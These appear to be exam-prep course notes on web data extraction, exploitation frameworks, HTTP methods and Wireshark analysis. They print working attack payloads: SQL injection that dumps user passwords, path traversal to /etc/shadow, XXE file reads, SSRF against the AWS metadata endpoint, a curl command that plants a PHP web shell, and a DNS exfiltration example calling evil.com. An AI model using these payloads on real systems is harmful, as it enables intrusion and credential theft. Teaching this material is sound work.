# Session 4: Data Extraction, Advanced Exploitation & Wireshark

> **Exam Weight:** Medium-High | **Type:** Theory + Lab

---

## 1. Data Extraction Techniques

### 1.1 What is Data Extraction in Hacking Context?
Extracting sensitive information from a target system without authorization. Also called **data exfiltration** when moving data out of the network.

### 1.2 Web Application Data Extraction Methods

#### SQL Injection for Data Extraction
The most powerful method for extracting database content:

```sql
-- Step 1: Find number of columns
' ORDER BY 1--   (no error)
' ORDER BY 2--   (no error)
' ORDER BY 3--   (ERROR → 2 columns exist)

-- Step 2: Find data types (which columns show output)
' UNION SELECT NULL, NULL--
' UNION SELECT 'a', NULL--   (if 1st col is string)

-- Step 3: Get database name
' UNION SELECT database(), NULL--

-- Step 4: Get all table names
' UNION SELECT table_name, NULL FROM information_schema.tables 
  WHERE table_schema=database()--

-- Step 5: Get column names
' UNION SELECT column_name, NULL FROM information_schema.columns 
  WHERE table_name='users'--

-- Step 6: Extract data
' UNION SELECT username, password FROM users--
```

#### Blind SQLi Data Extraction
When no visible output exists:
```sql
-- Boolean-based: Extract one character at a time
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
-- If TRUE → no change in response
-- If FALSE → different response

-- Time-based: Confirm via delay
'; IF(SUBSTRING((SELECT password FROM users),1,1)='a') WAITFOR DELAY '0:0:5'--
```

### 1.3 IDOR for Data Extraction
```
Legitimate request:  GET /api/user/profile?id=1001
Attacker modifies:   GET /api/user/profile?id=1002
                              → Gets another user's data
```

### 1.4 Directory Traversal / Path Traversal
```
Normal:  http://example.com/getFile?name=report.pdf
Attack:  http://example.com/getFile?name=../../../../etc/passwd
         http://example.com/getFile?name=..%2F..%2F..%2Fetc%2Fshadow

Encoding bypasses:
  ../ → %2e%2e%2f (URL encoded)
  ../ → %252e%252e%252f (double URL encoded)
  ../ → ..%c0%af (Unicode)
```

### 1.5 XXE (XML External Entity) Injection — Data Extraction

#### What is XXE?
When an XML parser processes external entity references, an attacker can define entities that read files or make network requests.

```xml
<!-- Malicious XML payload -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
<!-- Server processes this and returns /etc/passwd content -->
```

#### XXE Variants
| Variant | What it does |
|---------|-------------|
| **File Read** | Read local files (`file:///etc/passwd`) |
| **SSRF via XXE** | Access internal network (`http://192.168.1.1/admin`) |
| **Blind XXE** | Out-of-band data exfiltration via DNS/HTTP |
| **DOS via XXE** | "Billion Laughs" attack — recursive entity expansion |

> **Tricky Q:** What is the "Billion Laughs" attack?
> **A:** A DoS via XXE where entities are defined recursively, exponentially expanding memory usage (lol9 → lol8×10 → ... = billions of "lol" strings).

> **Tricky Q:** Which HTTP method is most vulnerable to XXE?
> **A:** Any method that accepts XML (POST with `Content-Type: application/xml`). But also check API endpoints that accept XML-formatted bodies.

### 1.6 SSRF (Server-Side Request Forgery)
Server makes requests on behalf of attacker to internal resources:
```
Attacker → Web Server → Internal DB/Admin Panel (unreachable directly)

Payload: ?url=http://169.254.169.254/latest/meta-data/
(AWS metadata endpoint — extracts cloud credentials!)

Or: ?url=http://localhost/admin
```

> **Tricky Q:** Why is the URL `169.254.169.254` significant in SSRF?
> **A:** It is the AWS EC2 instance metadata endpoint. SSRF to this URL can leak IAM credentials and sensitive cloud configuration.

---

## 2. Advanced Identification and Exploitation

### 2.1 Fingerprinting / Enumeration

#### OS Fingerprinting
Determining the target's operating system:
- **Active:** Send specially crafted packets, analyze responses (TTL, TCP window size)
- **Passive:** Sniff traffic without sending packets

| OS | Default TTL | TCP Window Size |
|----|------------|----------------|
| Windows | 128 | 65,535 |
| Linux | 64 | 5,840 |
| Cisco IOS | 255 | 4,128 |
| macOS | 64 | 65,535 |

> **Tricky Q:** A packet has TTL=120 when received. What OS likely sent it?
> **A:** Windows (starts at 128, decremented each hop; 120 means ~8 hops from a Windows machine)

#### Banner Grabbing
Extracting version information from service banners:
```bash
# Telnet banner grab
telnet target.com 80
GET / HTTP/1.0
(response reveals: Apache/2.4.49, PHP/7.4.0, etc.)

# Netcat banner grab
nc target.com 22
(SSH banner: OpenSSH_8.2p1 Ubuntu-4ubuntu0.5)

# Nmap banner grab
nmap -sV --script=banner target.com
```

#### Web Application Fingerprinting
```
Tools: Wappalyzer, WhatWeb, Nikto

Identifies:
- Web server (Apache, Nginx, IIS)
- Framework (WordPress, Drupal, Laravel)
- JavaScript libraries
- Server-side language (PHP, ASP.NET)
```

### 2.2 Exploitation Frameworks

#### Metasploit Framework
Most popular exploitation framework:
```
Architecture:
├── Exploits    → Code that leverages vulnerabilities
├── Payloads    → Code that runs after exploitation
│   ├── Singles    → Small, self-contained
│   ├── Stagers    → Set up connection for staged payloads
│   └── Stages     → Downloaded by stager, larger capability
├── Auxiliaries → Scanners, fuzzers, sniffers
├── Encoders    → Obfuscate payloads to evade AV
└── NOPs        → No-operation sleds for buffer overflows

Key Commands:
msfconsole           # Start Metasploit
search <term>        # Search for modules
use <module>         # Select module
show options         # Display required settings
set RHOSTS <ip>      # Set target
set PAYLOAD <payload>
exploit / run        # Execute the attack
sessions -l          # List active sessions
```

#### Payload Types
| Payload | Description |
|---------|-------------|
| **Meterpreter** | Advanced, in-memory payload. Most powerful |
| **Shell** | Basic command shell on target |
| **VNC** | Remote desktop access |
| **Bind shell** | Target opens port, attacker connects |
| **Reverse shell** | Target connects back to attacker (bypasses firewall) |

> **Tricky Q:** Why is a reverse shell preferred over a bind shell?
> **A:** Firewalls typically block inbound connections but allow outbound. Reverse shell = target initiates outbound connection to attacker, bypassing inbound firewall rules.

---

## 3. HTTP Methods (1.0 & 1.1) — Security Focus

### 3.1 HTTP/1.0 vs HTTP/1.1

| Feature | HTTP/1.0 | HTTP/1.1 |
|---------|----------|----------|
| Connections | New TCP per request | Persistent connections (keep-alive) |
| Host header | Optional | Mandatory |
| Chunked transfer | Not supported | Supported |
| Caching | Basic | Full Cache-Control |
| Methods | GET, POST, HEAD | + PUT, DELETE, OPTIONS, TRACE, PATCH |
| Pipelining | No | Yes |

### 3.2 Dangerous HTTP Methods

```bash
# Check which methods are allowed
curl -X OPTIONS http://target.com -v
# Response: Allow: GET, POST, PUT, DELETE, OPTIONS, TRACE

# PUT — upload a file (can create a web shell!)
curl -X PUT http://target.com/shell.php -d '<?php system($_GET["cmd"]); ?>'
# Now visit: http://target.com/shell.php?cmd=whoami

# TRACE — Cross-Site Tracing (XST)
curl -X TRACE http://target.com
# Echoes back full request including HttpOnly cookies!
# (Most modern servers disable TRACE)

# DELETE — delete server files
curl -X DELETE http://target.com/important-file.txt
```

> **Tricky Q:** How can TRACE method bypass the HttpOnly cookie protection?
> **A:** TRACE echoes back all request headers including cookies. XSS + TRACE = XST. Even HttpOnly cookies appear in the echoed response accessible to JavaScript. Solution: Disable TRACE on all servers.

### 3.3 HTTP Response Codes (Security Relevance)

| Code | Meaning | Security Relevance |
|------|---------|-------------------|
| 200 | OK | Normal |
| 301/302 | Redirect | Open redirect vulnerability |
| 401 | Unauthorized | Authentication required |
| 403 | Forbidden | Access denied (endpoint exists!) |
| 404 | Not Found | Does NOT confirm resource nonexistence |
| 500 | Internal Server Error | May reveal stack traces/tech info |
| 503 | Service Unavailable | May indicate DoS success |

> **Tricky Q:** Why is a 403 response useful to an attacker?
> **A:** It confirms the resource EXISTS (just access-denied). 404 might also be returned to hide resources. 403 = "I know about this path."

---

## 4. Wireshark — Network Traffic Analysis

### 4.1 What is Wireshark?
A **packet capture and analysis tool** that captures all network traffic on an interface and lets you inspect each packet.

**Also known as:** Ethereal (old name)

### 4.2 Key Features
- Capture live traffic or analyze pcap files
- 1000+ protocol dissectors
- Powerful display and capture filters
- Follow TCP/UDP streams
- Export objects (HTTP files, images)

### 4.3 Wireshark Filters

#### Capture Filters (BPF syntax — before capture)
```
host 192.168.1.1          # Only traffic to/from this IP
port 80                   # Only traffic on port 80
tcp                       # Only TCP traffic
not arp                   # Exclude ARP
src host 10.0.0.1         # Only from this source
dst port 443              # Only to port 443
```

#### Display Filters (after capture — more powerful)
```
ip.addr == 192.168.1.1    # Filter by IP
tcp.port == 80            # Filter by port
http                      # Show HTTP traffic
http.request.method == "POST"   # POST requests only
http.request.uri contains "login"  # URIs containing "login"
tcp.flags.syn == 1        # SYN packets (detect SYN flood)
dns                       # DNS traffic
ftp                       # FTP traffic
smtp                      # SMTP traffic
tcp.analysis.retransmission  # Retransmissions
```

### 4.4 What Attackers Look for in Wireshark

| What to find | Filter | Risk |
|-------------|--------|------|
| Plaintext passwords | `ftp`, `http`, `telnet` | Credential exposure |
| Session cookies | `http.cookie` | Session hijacking |
| DNS queries | `dns` | Reconnaissance info |
| ARP traffic | `arp` | ARP spoofing/poisoning |
| Unencrypted email | `smtp`, `pop`, `imap` | Email interception |

> **Tricky Q:** What is the difference between a capture filter and a display filter in Wireshark?
> **A:** Capture filters are applied before/during capture (BPF syntax, less flexible, filters what's stored). Display filters are applied after capture (richer syntax, filters what's shown). Capture filters reduce file size; display filters allow re-analysis.

### 4.5 Protocol Analysis — Detecting Attacks

#### Detecting SYN Flood
```
Filter: tcp.flags.syn == 1 && tcp.flags.ack == 0
Look for: Many SYN packets from varied IPs with no ACK responses
```

#### Detecting ARP Poisoning
```
Filter: arp
Look for: Multiple ARP replies claiming same IP has different MACs
Indicator: Gratuitous ARP packets
```

#### Detecting DNS Exfiltration
```
Filter: dns
Look for: Unusually long DNS query names (data encoded in subdomain)
Example: dGVzdGRhdGE=.evil.com → base64 data in DNS query
```

---

## 5. Exam Questions Bank

**Q1:** What is the difference between data extraction and data exfiltration?
**A:** Data extraction = pulling data from a database/system (SQLi). Data exfiltration = moving data out of the network to attacker's control. Exfiltration is extraction + transfer.

**Q2:** What is the AWS metadata IP address used in SSRF attacks?
**A:** `169.254.169.254`

**Q3:** What is the difference between Meterpreter and a regular shell payload in Metasploit?
**A:** Meterpreter runs in memory (no file on disk), is encrypted, can load modules on-the-fly, and has more capabilities (file operations, pivoting, screenshot). Regular shell is simpler but leaves more traces.

**Q4:** Why should HTTP TRACE method be disabled?
**A:** It enables Cross-Site Tracing (XST) which can leak cookies including HttpOnly cookies via XSS.

**Q5:** Which Wireshark filter shows only HTTP POST requests?
**A:** `http.request.method == "POST"`

**Q6:** What is blind SQL injection?
**A:** SQLi where no data is returned directly to the attacker. Data is inferred via boolean responses (different page behavior) or time delays.

**Q7:** What is a web shell?
**A:** A script (PHP/ASP/JSP) uploaded to a web server that allows remote command execution via HTTP, acting as a persistent backdoor.

**Q8:** What TTL would indicate Linux is the source OS?
**A:** 64 (Linux default TTL is 64, Windows is 128)

---

*Next: Session 5 → SAST, DAST, Case Studies*